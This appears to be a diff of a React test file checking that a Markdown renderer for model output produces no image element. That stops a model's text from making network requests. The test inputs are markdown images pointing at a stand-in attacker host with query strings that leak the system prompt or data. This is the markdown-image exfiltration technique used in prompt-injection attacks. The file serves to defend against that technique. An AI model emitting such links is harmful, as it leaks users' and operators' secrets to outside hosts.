@@ -88,13 +88,13 @@ describe('Markdown does not let the model make requests', () => {
     const { container } = render(<Markdown text={'![x](https://evil.example/b.png?leak=SYSTEM_PROMPT)'} />);
     expect(container.querySelector('img'), 'an <img> here IS the request').toBeNull();
     // Nothing is hidden from the operator. This used to assert the ALT text was present, which is true
-    // Whether or not the address is shown — and with an alt present the address was in fact dropped.
+    // whether or not the address is shown — and with an alt present the address was in fact dropped.
     expect(container.querySelector('[title]')?.getAttribute('title')).toBe('https://evil.example/b.png?leak=SYSTEM_PROMPT');
   });
 
   // No image element is produced at all, and that is deliberate rather than blunt: react-markdown's
-  // Own sanitizer strips `data:` before this component runs (measured — the src arrives as ''), so a
-  // Branch permitting inline data images would read as a live allowance while never firing.
+  // own sanitizer strips `data:` before this component runs (measured — the src arrives as ''), so a
+  // branch permitting inline data images would read as a live allowance while never firing.
   it('shows the address even when an alt is present — the common case', () => {
     const { container } = render(<Markdown text={'![chart](https://evil.example/b.png?leak=DATA)'} />);
     expect(container.textContent).toContain('chart');
